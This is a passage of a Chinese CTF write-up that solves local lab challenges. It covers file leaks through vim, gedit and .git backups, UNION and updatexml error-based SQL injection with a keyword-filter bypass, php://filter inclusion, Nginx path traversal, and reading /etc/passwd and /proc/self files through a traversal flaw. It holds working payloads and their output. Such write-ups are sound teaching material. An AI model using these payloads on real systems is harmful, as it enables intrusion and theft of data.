http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br></pre></td></tr></table></figure></li>
<li>发现存在可疑文件：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">robots.txt   # 常规文件，记录一些目录和 CMS版本信息</span><br><span class="line">index.php~   # gedit 备份文件</span><br><span class="line">.index.php.swp  # vim 备份文件</span><br></pre></td></tr></table></figure></li>
<li>根据书中方法一一查验可得 flag<ul>
<li>通过 url(<a href="http://127.0.0.1/robots.txt">http://127.0.0.1/robots.txt</a>) 直接访问 robots.txt，，获得 flag: /flag1_is_her3_fun.txt</li>
<li>通过 url(<a href="http://127.0.0.1/index.php">http://127.0.0.1/index.php</a><del>) 直接访问 index.php</del>，获得 flag：flag2:s_v3ry_im</li>
<li>通过 url(<a href="http://127.0.0.1/.index.php.swp">http://127.0.0.1/.index.php.swp</a>) 直接访问 .index.php.swp, .index.php.swp 会下载到本地<ul>
<li>先创建一个 index.php 文件，与 index.php.swp 同目录。命令: <code>touch index.php</code></li>
<li>使用 <code>vim -r index.php</code> 命令恢复文件的内容。</li>
<li>使用 <code>:x</code> 保存并退出 vim 编辑</li>
<li>使用命令 <code>cat index.php | grep flag</code>，查看 flag。命令回显： <?php echo 'flag3:p0rtant_hack}';?> </li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="1-1-2-粗心的小李"><a href="#1-1-2-粗心的小李" class="headerlink" title="1.1.2 粗心的小李"></a>1.1.2 粗心的小李</h3><ol>
<li><p>先使用 目录扫描工具 dirsearch 扫描 127.0.0.1 文件信息，获得下列文件目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200     5B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;COMMIT_EDITMSG</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;</span><br><span class="line">301   305B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;</span><br><span class="line">200    23B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;HEAD</span><br><span class="line">200    73B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;description</span><br><span class="line">200   137B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;config</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;hooks&#x2F;</span><br><span class="line">200   240B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;exclude</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;</span><br><span class="line">200   145B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;index</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;HEAD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;</span><br><span class="line">301   321B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;objects&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;</span><br><span class="line">200    41B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">301   316B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;tags    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;tags&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br></pre></td></tr></table></figure></li>
<li><p>发现存在<code>.git</code>文件夹，试探访问<code>.git/config</code>，返回了下列内容，说明存在 git 泄露。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion &#x3D; 0</span><br><span class="line">	filemode &#x3D; true</span><br><span class="line">	bare &#x3D; false</span><br><span class="line">	logallrefupdates &#x3D; true</span><br><span class="line">	ignorecase &#x3D; true</span><br><span class="line">	precomposeunicode &#x3D; true</span><br></pre></td></tr></table></figure></li>
<li><p>使用 <a href="https://github.com/denny0223/scrabble">scrabble</a> 工具，成功获到源码，拿到 flag。</p>
<blockquote>
<p>重新初始化已存在的 Git 仓库于 /home/chang/compose/ctf/tools/scrabble/.git/<br>parseCommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88<br>downloadBlob 213b7e386e9b0b406d91fae58bf8be11a58c3f88<br>parseTree f46fbac4149604ca13a765950f9a2d1fd8c1c7ad<br>downloadBlob f46fbac4149604ca13a765950f9a2d1fd8c1c7ad<br>downloadBlob 1e0db5d96b5cc9785055c14bbec0e7ad14f48151<br>HEAD 现在位于 213b7e3 flag</p>
</blockquote>
</li>
</ol>
<h2 id="1-2-SQL注入"><a href="#1-2-SQL注入" class="headerlink" title="1.2 SQL注入"></a>1.2 SQL注入</h2><h3 id="1-2-1-SQL注入-1"><a href="#1-2-1-SQL注入-1" class="headerlink" title="1.2.1 SQL注入-1"></a>1.2.1 SQL注入-1</h3><ol>
<li><p>127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。</p>
</li>
<li><p>尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。</p>
<ul>
<li>%27：单引号 ‘</li>
<li>%23：注释 #</li>
</ul>
</li>
<li><p>尝试 UNION 注入，127.0.0.1/index.php?id=-1%27union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。</p>
</li>
<li><p>尝试获取表明 <code>127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23</code>，得到 fl4g，notes 两个表。</p>
</li>
<li><p>分别尝试获取列名。<code>127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23</code>。在 fl4g 中获得 flag。</p>
</li>
</ol>
<h3 id="1-2-2-SQL注入-2"><a href="#1-2-2-SQL注入-2" class="headerlink" title="1.2.2 SQL注入-2"></a>1.2.2 SQL注入-2</h3><ol>
<li><p>访问 127.0.0.1，服务器返回 Forbidden，说明入口错误。尝试使用 dirsearch 工具扫描目录，发现 login.php、user.php 状态是200，找到入口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;login.php</span><br><span class="line">403   289B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   290B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">200    11B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;user.php</span><br></pre></td></tr></table></figure></li>
<li><p>访问 <a href="http://127.0.0.1/login.php">http://127.0.0.1:80/login.php</a> ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：<code>如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦</code></p>
</li>
<li><p>安装 burp suit 社区版<br>下载链接：<a href="https://portswigger.net/burp/releases/professional-community-2021-2-1">https://portswigger.net/burp/releases/professional-community-2021-2-1</a><br>安装命令：<code>sh burpsuite_community_linux_v2021_2_1.sh</code> </p>
</li>
<li><p>配置 burp suit</p>
<blockquote>
<ol>
<li>进入 Proxy -&gt;  option，选择 add，端口用 8080，选择  Loopback only。</li>
<li>进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_proxy.png" alt="burp proxy"></li>
</ol>
</blockquote>
</li>
<li><p>使用 burp suit 抓包、发包。</p>
<blockquote>
<p>进入 Proxy -&gt; intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_intercept.png" alt="burp intercept"></p>
</blockquote>
</li>
<li><p>火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。</p>
</li>
<li><p>burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 <code>ifconfig</code> 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。</p>
</li>
<li><p>burp 捕获访问 <a href="http://172.19.0.1/login.php">http://172.19.0.1/login.php</a> 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：<code>Send to Repeater（Ctrl + R）</code>，再进入 Repeater 页面。在 request 中修改请求头。</p>
</li>
<li><p> 根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123’（登录的用户名），成功返回 SQL 报错信息：</p>
<blockquote>
<p>string(154) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’123’’’ at line 1”<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_login_request.png" alt="burp login request"></p>
</blockquote>
</li>
<li><p>可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：</p>
<blockquote>
<p><code>name=123&#39;or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&amp;pass=123</code></p>
</blockquote>
<p>返回报错内容：string(34) “Operand should contain 1 column(s)”</p>
<p>可能只有1列，尝试 <code>name=123&#39;or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&amp;pass=123</code></p>
<p>返回报错内容：<code>~7~</code>。确定格式。（0x7e：~ ）</p>
</li>
<li><p>使用完整 SQL 语句测试：<code>name=123&#39;or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&amp;pass=123</code>,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息<code>~7~</code>。</p>
<blockquote>
<p>string(164) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘from dual)),1)#’’ at line 1”</p>
</blockquote>
</li>
<li><p>通过获取表名，列名成功获得 flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) ,0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line"># 返回信息：string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="1-3-任意文件读取漏洞"><a href="#1-3-任意文件读取漏洞" class="headerlink" title="1.3 任意文件读取漏洞"></a>1.3 任意文件读取漏洞</h2><h3 id="1-3-1-afr-1"><a href="#1-3-1-afr-1" class="headerlink" title="1.3.1 afr_1"></a>1.3.1 afr_1</h3><ol>
<li><p>访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中”病者多诡(HCTF 2016)”，很有可能类似，猜测存在 include 函数，p 可能是 page。</p>
</li>
<li><p>使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_1_wappalyzer.png" alt="wappalyzer"></p>
</li>
<li><p>使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello</p>
</li>
<li><p>于是尝试访问 <code>http://172.19.0.1/index.php</code>，重定向至了<code>http://172.19.0.1/?p=hello</code>，而访问<code>http://172.19.0.1/?p=index</code>则是报错。</p>
</li>
<li><p>尝试使用 php 的 filter 获取 index.php,<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index</code>,获得数据<code>PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=</code>，Base64 解码后得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">  include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>清楚了逻辑，直接尝试 <code>flag.php</code>,即<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag</code>,获得数据<code>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</code>，解码得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
<p>明显注释中可能表示 flag，查看官方 write up:<code>http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag</code>，确定无错。</p>
</li>
<li><p>php://协议 Filter解读： <code>?p=php://filter/read=convert.Base64-encode/resource=flag</code></p>
<ul>
<li>这是 p 关键字得 get 传递，即p=****</li>
<li>php://是一种协议名称，php://filter/ 是一种访问本地文件的协议</li>
<li>read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签</li>
<li>/resource=flag 表示目标文件是 flag.php</li>
</ul>
</li>
</ol>
<h3 id="1-3-2-afr-2"><a href="#1-3-2-afr-2" class="headerlink" title="1.3.2 afr_2"></a>1.3.2 afr_2</h3><ol>
<li><p>访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_2_wappalyzer.png" alt="wappalyzer"></p>
</li>
<li><p>使用 dirsearch 进行目录扫描，发现<code>/img</code>目录可以直接访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">301   194B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;img    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;172.19.0.1&#x2F;img&#x2F;</span><br><span class="line">200    99B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li><p>想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径<code>/img../</code>，获得 flag。</p>
</li>
</ol>
<h3 id="1-3-3-afr-3"><a href="#1-3-3-afr-3" class="headerlink" title="1.3.3 afr_3"></a>1.3.3 afr_3</h3><ul>
<li>【知识点】:<ul>
<li>任意文件读取</li>
<li>flask SSTI 模板注入<ul>
<li><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></li>
</ul>
</li>
<li>session 伪造<ul>
<li><a href="https://blog.csdn.net/DonkeyMoon/article/details/109690476">flask session 伪造</a></li>
<li><a href="https://blog.csdn.net/rfrder/article/details/109188719">[HCTF 2018]admin 1</a></li>
<li><a href="https://blog.csdn.net/SopRomeo/article/details/111186821?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328680.24088.16162219708244293&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">N1BOOK 入门session伪造</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ol>
<li><p><code>172.19.0.1:5000</code> 访问本题环境，在 <code>your name</code>框键入<code>test</code>，点<code>提交</code>。</p>
</li>
<li><p>跳转到了<code>http://172.19.0.1:5000/n1page</code>,并且页面显示：<code>Hello : test, why you don&#39;t look at our article?</code>，点击 <code>article</code> 跳转到了<code>http://172.19.0.1:5000/article?name=article</code></p>
</li>
<li><p>注意到 url 中有参数 name=article,尝试随意赋值 name，页面回显：<code>[Errno 2] No such file or directory: &#39;/home/nu11111111l/articles/article1&#39;</code>，获得路径信息，并且极有可能是 linux 服务器，其实在 wappalyzer 中有检测出是 ubuntu</p>
</li>
<li><p>尝试文件读取漏洞中常见的读取路径。先尝试 <code>/etc/passwd</code>，这个目录保存用户信息及其工作目录的文件,一般呗用作 linux 系统下文件读取漏洞存在性判断的基准。访问<code>http://172.19.0.1:5000/article?name=/../../../etc/passwd</code>,成功回显<code>passwd</code>文件信息。研究了下 linux 的 passwd，没发现特殊的信息，继续尝试其他路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash </span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync </span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">messagebus:x:101:101::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure></li>
<li><p>尝试 <code>/proc/self/cmdline</code>,，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cmdline</code>，获得回显信息：<code>pythonserver.py</code>,获得题目是 python 的服务器。</p>
</li>
<li><p>尝试在 <code>environ</code> 查看环境变量，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/environ</code>,获得环境变量,得知<code>server.py</code> 在 <code>/home/sssssserver</code>路径下。</p>
<blockquote>
<p>HOSTNAME=c0b8f0d6cb78HOME=/rootPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/home/sssssserver</p>
</blockquote>
</li>
<li><p>直接访问<code>server.py</code>，即<code>http://172.19.0.1:5000/article?name=/../../../home/sssssserver/server.py</code>,成功回显 <code>server.py</code> 源码。（server.py 可以通过<code>/proc/self/cwd</code>进入当前应用所在目录直接获得，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cwd/server.py</code>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, render_template, request, url_for, redirect, session, render_template_string)</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execfile() 函数可以用来执行一个文件。</span></span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line">FLAG = flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在flask项目中，Session, Cookies以及一些第三方扩展都会用到SECRET_KEY值，这是一个比较重要的配置值。</span></span><br><span class="line">app.secret_key = key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 host/n1page 时会进入此方法</span></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">	<span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line">	n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 过滤</span></span><br><span class="line">	<span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line"></span><br><span class="line">	template = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">			&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">			Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">			 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">return</span> render_template_string(template) @ app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">	error = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">    	page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">    	page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">		page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    	template = e</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, 